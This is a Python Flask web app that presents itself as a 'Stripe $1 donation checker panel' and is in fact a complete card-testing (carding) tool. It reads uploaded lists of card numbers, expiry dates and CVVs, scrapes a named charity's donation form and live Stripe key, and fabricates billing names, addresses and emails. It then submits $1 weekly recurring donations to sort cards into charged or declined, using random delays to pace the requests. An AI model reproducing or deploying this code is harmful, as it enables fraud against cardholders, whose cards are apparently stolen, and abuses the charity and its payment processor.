# app.py
# Vercel-compatible Flask app for Stripe $1 donation checker panel
# No app.run() — Vercel calls the 'app' object directly

import os
import re
import time
import random
import string
import threading
from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = os.urandom(32)

# Shared state (protected where necessary)
checking_lock = threading.Lock()
stop_requested = False
check_results = []
is_checking_active = False
total_cards_count = 0

def random_name_parts():
    first_names = ["Ahmed", "Mohamed", "Sarah", "Omar", "Layla", "Youssef", "Fatima", "Hassan", "Amina"]
    last_names  = ["Khalil", "Abdullah", "Smith", "Johnson", "Garcia", "Lopez", "Bennett", "Clark", "Evans"]
    return random.choice(first_names), random.choice(last_names)

def random_billing_info():
    cities  = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states  = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zips    = ["10001", "90001", "60601", "77001", "85001"]
    
    idx = random.randrange(len(cities))
    city = cities[idx]
    state = states[idx]
    street = f"{random.randint(10, 9999)} {random.choice(streets)}"
    zip_code = zips[idx]
    
    return city, state, street, zip_code

def random_email_address():
    base = ''.join(random.choices(string.ascii_lowercase + string.digits, k=14))
    return f"{base}{random.randint(10,99)}@gmail.com"

def check_cards(card_lines):
    global stop_requested, check_results, is_checking_active, total_cards_count

    user_agent = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"

    with checking_lock:
        total_cards_count = len(card_lines)
        check_results = []
        is_checking_active = True
        stop_requested = False

    session = requests.Session()

    for index, raw_line in enumerate(card_lines, 1):
        with checking_lock:
            if stop_requested:
                check_results.append((index, raw_line.strip(), "STOPPED BY USER"))
                break

        line = raw_line.strip()
        if '|' not in line:
            continue

        try:
            number, month, year_full, cvv = [part.strip() for part in line.split('|')]
            year_short = year_full.strip()[-2:]
            cc_line = line
        except:
            check_results.append((index, line, "INVALID FORMAT"))
            continue

        # 1. Load donation page
        try:
            page = session.get(
                "https://pipelineforchangefoundation.com/donate/",
                headers={"User-Agent": user_agent},
                timeout=15
            )
            soup = BeautifulSoup(page.text, "html.parser")

            form_id   = soup.find("input", {"name": "charitable_form_id"})["value"]
            nonce     = soup.find("input", {"name": "_charitable_donation_nonce"})["value"]
            campaign  = soup.find("input", {"name": "campaign_id"})["value"]
            pk_live_match = re.search(r'"key":"(pk_live_[^"]+)"', page.text)
            pk_live   = pk_live_match.group(1) if pk_live_match else None

            if not all([form_id, nonce, campaign, pk_live]):
                check_results.append((index, cc_line, "Missing form fields or Stripe key"))
                continue
        except Exception as e:
            check_results.append((index, cc_line, f"PAGE LOAD ERROR — {str(e)[:80]}"))
            continue

        fn, ln = random_name_parts()
        city, state, address, zipcode = random_billing_info()
        email = random_email_address()

        # 2. Create Stripe Payment Method
        pm_data = {
            "type": "card",
            "billing_details[name]": f"{fn} {ln}",
            "billing_details[email]": email,
            "billing_details[address][city]": city,
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": address,
            "billing_details[address][postal_code]": zipcode,
            "billing_details[address][state]": state,
            "card[number]": number,
            "card[cvc]": cvv,
            "card[exp_month]": month,
            "card[exp_year]": year_short,
            "key": pk_live,
        }

        try:
            pm_response = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=pm_data,
                headers={"User-Agent": user_agent},
                timeout=12
            )
            pm_response.raise_for_status()
            pm_id = pm_response.json()["id"]
        except Exception as e:
            check_results.append((index, cc_line, f"PM CREATION FAILED — {str(e)[:90]}"))
            continue

        # 3. Submit donation
        donation_data = {
            "charitable_form_id": form_id,
            form_id: "",
            "_charitable_donation_nonce": nonce,
            "campaign_id": campaign,
            "description": "Support",
            "ID": "742502",
            "recurring_donation": "yes",
            "donation_amount": "recurring-custom",
            "custom_recurring_donation_amount": "1.00",
            "recurring_donation_period": "week",
            "first_name": fn,
            "last_name": ln,
            "email": email,
            "address": address,
            "city": city,
            "state": state,
            "postcode": zipcode,
            "country": "US",
            "gateway": "stripe",
            "stripe_payment_method": pm_id,
            "action": "make_donation",
        }

        try:
            ajax_response = session.post(
                "https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php",
                data=donation_data,
                headers={
                    "User-Agent": user_agent,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://pipelineforchangefoundation.com/donate/",
                },
                timeout=20
            )

            content = ajax_response.text.lower()
            if "thank you" in content or "successfully" in content:
                result_text = "CHARGED 1.00$ ✅"
            elif "requires_action" in content:
                result_text = "3DS / ACTION REQUIRED"
            else:
                result_text = f"DECLINED / {ajax_response.text[:140].replace('<','').replace('>','')}"
        except Exception as e:
            result_text = f"REQUEST ERROR — {str(e)[:100]}"

        check_results.append((index, cc_line, result_text))
        time.sleep(random.uniform(4.2, 9.8))

    with checking_lock:
        is_checking_active = False

# ─── HTML TEMPLATES ──────────────────────────────────────────────────────

LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - FTX Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Battambang:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {font-family:'Battambang',cursive; background:#f8fafc; height:100vh; margin:0; display:flex; align-items:center; justify-content:center;}
    .card {background:white; padding:2.5rem; border-radius:16px; box-shadow:0 10px 25px rgba(0,0,0,0.12); max-width:380px; text-align:center;}
    input {width:100%; padding:0.9rem; margin:0.6rem 0; border:1px solid #cbd5e1; border-radius:8px; box-sizing:border-box;}
    button {width:100%; padding:1rem; background:#4f46e5; color:white; border:none; border-radius:8px; font-weight:bold; cursor:pointer;}
    button:hover {background:#4338ca;}
    h2 {color:#4f46e5; margin-bottom:1.5rem;}
  </style>
</head>
<body>
  <div class="card">
    <h2>FTX Panel</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>"""

PANEL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FTX Charger Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Battambang&display=swap" rel="stylesheet">
  <style>
    body {font-family:'Battambang',cursive; background:#f1f5f9; margin:0; padding:1.5rem; color:#1e293b;}
    .container {max-width:1000px; margin:auto; background:white; padding:1.8rem; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.07);}
    h1 {color:#4f46e5; text-align:center; margin-bottom:1rem;}
    form {text-align:center; margin:1.5rem 0;}
    input[type=file] {width:100%; max-width:480px; padding:0.8rem; border:2px dashed #94a3b8; border-radius:8px;}
    button {background:#4f46e5; color:white; border:none; padding:0.9rem 2rem; border-radius:8px; font-size:1.05rem; cursor:pointer; margin:0.5rem;}
    button.stop {background:#ef4444;}
    button:hover {opacity:0.92;}
    textarea {width:100%; height:220px; font-family:monospace; font-size:0.95rem; padding:1rem; border:1px solid #cbd5e1; border-radius:8px; margin:1rem 0;}
    table {width:100%; border-collapse:collapse; margin-top:1rem;}
    th, td {padding:9px; text-align:left; border-bottom:1px solid #e2e8f0;}
    th {background:#e0e7ff;}
    .success {color:#16a34a; font-weight:bold;}
    .fail {color:#dc2626;}
    .warn {color:#d97706;}
    .status {text-align:center; font-size:1.1rem; margin:1rem 0; color:#475569;}
  </style>
</head>
<body>
  <div class="container">
    <h1>FTX Stripe $1 Donate Charger</h1>

    {% if not is_checking_active %}
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="ccfile" accept=".txt" required><br>
      <button type="submit">Upload & Start Checking</button>
    </form>
    {% else %}
    <div class="status">Processing {{ len(check_results) }} / {{ total_cards_count }} cards...</div>
    <button class="stop" onclick="stopChecking()">STOP CHECKING</button>
    {% endif %}

    {% if check_results %}
    <h3>Results</h3>
    <button onclick="copyResults()">Copy All Results</button>
    <textarea id="resultText" readonly>{% for i, cc, res in check_results %}{{ i }} | {{ cc }} | {{ res }}\n{% endfor %}</textarea>

    <table>
      <tr><th>#</th><th>CC</th><th>Result</th></tr>
      {% for i, cc, res in check_results %}
      <tr>
        <td>{{ i }}</td>
        <td style="font-family:monospace;">{{ cc }}</td>
        <td class="{% if 'CHARGED' in res %}success{% elif 'DECLINED' in res or 'FAILED' in res or 'ERROR' in res|upper %}fail{% else %}warn{% endif %}">{{ res }}</td>
      </tr>
      {% endfor %}
    </table>
    {% endif %}
  </div>

  <script>
    function copyResults() {
      navigator.clipboard.writeText(document.getElementById("resultText").value)
        .then(() => alert("Results copied to clipboard!"));
    }
    function stopChecking() {
      if (confirm("Stop checking now?")) {
        fetch("/stop", {method: "POST"})
          .then(() => location.reload());
      }
    }
    {% if is_checking_active %}
    setTimeout(() => location.reload(), 7000);
    {% endif %}
  </script>
</body>
</html>"""

@app.route("/", methods=["GET", "POST"])
def login_view():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        if username == "admin" and password == "ftx123":
            session["logged_in"] = True
            return redirect(url_for("panel_view"))
        return render_template_string(LOGIN_HTML + '<p style="color:red; text-align:center; margin-top:1rem;">Wrong username or password</p>')
    return render_template_string(LOGIN_HTML)

@app.route("/panel", methods=["GET", "POST"])
def panel_view():
    global stop_requested, is_checking_active

    if not session.get("logged_in"):
        return redirect(url_for("login_view"))

    if request.method == "POST" and not is_checking_active:
        uploaded_file = request.files.get("ccfile")
        if uploaded_file and uploaded_file.filename.lower().endswith(".txt"):
            try:
                content = uploaded_file.read().decode("utf-8", errors="ignore")
                lines = [line.strip() for line in content.splitlines() if '|' in line and len(line.split('|')) >= 4]
                if lines:
                    threading.Thread(target=check_cards, args=(lines,), daemon=True).start()
            except Exception:
                pass  # silent fail — better UX than 500 error

    return render_template_string(PANEL_HTML,
                                 is_checking_active=is_checking_active,
                                 check_results=check_results,
                                 total_cards_count=total_cards_count)

@app.route("/stop", methods=["POST"])
def stop_checking():
    global stop_requested
    with checking_lock:
        stop_requested = True
    return jsonify({"status": "stopping"})

# ────────────────────────────────────────────────
#   VERY IMPORTANT: No if __name__ == "__main__" block
#   Vercel expects the 'app' object to be importable
# ────────────────────────────────────────────────
